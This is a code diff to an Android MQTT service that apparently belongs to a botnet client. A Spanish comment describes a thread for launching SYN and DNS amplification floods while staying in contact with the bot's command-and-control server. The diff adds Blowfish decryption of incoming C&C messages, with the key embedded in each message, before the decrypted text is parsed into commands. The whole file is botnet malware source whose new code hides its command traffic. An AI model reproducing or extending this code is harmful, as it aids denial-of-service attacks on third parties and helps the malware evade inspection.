@@ -1,7 +1,6 @@
 package com.gshp.mqttpersistencev2;
 
 import android.annotation.SuppressLint;
-import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -14,7 +13,6 @@ import android.os.Build;
 import android.os.IBinder;
 import android.util.Log;
 
-import androidx.annotation.LongDef;
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
 
@@ -31,7 +29,16 @@ import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
-import java.lang.Thread;
+import java.math.BigInteger;
+import java.security.InvalidKeyException;
+import java.security.Key;
+import java.security.NoSuchAlgorithmException;
+
+import javax.crypto.BadPaddingException;
+import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.spec.SecretKeySpec;
 
 class MyThread implements Runnable { //Hilo implementado para crear inundación Syn/AMP dns, y de esta manera, seguir teniendo comunicación con bot-C&C
 
@@ -157,6 +164,17 @@ public class MqttConnectionManagerService extends Service {
         return START_STICKY;
     }
 
+    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();
+    public static String bytesToHex(byte[] bytes) {
+        char[] hexChars = new char[bytes.length * 2];
+        for (int j = 0; j < bytes.length; j++) {
+            int v = bytes[j] & 0xFF;
+            hexChars[j * 2] = HEX_ARRAY[v >>> 4];
+            hexChars[j * 2 + 1] = HEX_ARRAY[v & 0x0F];
+        }
+        return new String(hexChars);
+    }
+
     public void connect() {
 
         final String clientId = MqttClient.generateClientId();
@@ -184,11 +202,51 @@ public class MqttConnectionManagerService extends Service {
                 }
 
                 @Override
-                public void messageArrived(String topic, MqttMessage message) throws MqttException, IOException {
+                public void messageArrived(String topic, MqttMessage message) throws MqttException, NoSuchPaddingException, NoSuchAlgorithmException {
                     Log.d(TAG, "messageArrived: Topic: " + topic + " Message: " + message);
 
                     String s = String.valueOf(message);
-                    final String[] splited = s.split("\\s+");
+                    Log.d(TAG, "IRA WE->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +s);
+                    //Descifrando el mensaje
+                    int startIndex = Integer.parseInt(s.substring(0,2));
+                    int endIndex = Integer.parseInt(s.substring(2,4));
+                    int lengthKey = endIndex - startIndex;
+                    String subKey = s.substring(4,lengthKey+4);
+                    String encryptedPayload = s.substring(lengthKey+4);
+                    Log.d(TAG, "Subllave: "+subKey);
+
+
+
+                    Cipher cipher = Cipher.getInstance("Blowfish/ECB/PKCS5Padding");
+                    Key blowfishKey = new SecretKeySpec(subKey.getBytes(), "Blowfish");
+
+                    /*for (int i = lengthKey+4 ; i < s.length() ; i++){
+                        Log.d(TAG, "messageArrived: " + s.charAt(i));
+                    }*/
+
+                    try {
+                        cipher.init(Cipher.DECRYPT_MODE, blowfishKey);
+                    } catch (InvalidKeyException e) {
+                        e.printStackTrace();
+                    }
+                    byte[] decrypted = new byte[0];
+                    byte[] finalBytes = new BigInteger(encryptedPayload, 16).toByteArray();
+                    Log.d(TAG, "Cadena convertida en bytes: "+new String(finalBytes));
+                    Log.d(TAG, "Cadena convertida en bytes (en crudo): "+finalBytes);
+                    Log.d(TAG, "messageArrived: "+bytesToHex(finalBytes));
+
+                    try {
+                        decrypted = cipher.doFinal(finalBytes);
+                    } catch (BadPaddingException | IllegalBlockSizeException e) {
+                        e.printStackTrace();
+                    }
+
+                    String decryptedString = new String(decrypted);
+                    Log.d(TAG, "DESCIFRADO->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>: " +decryptedString);
+
+
+
+                    final String[] splited = decryptedString.split("\\s+");
 
                     final StringBuffer sb = new StringBuffer();
                     final String[] str = {""};
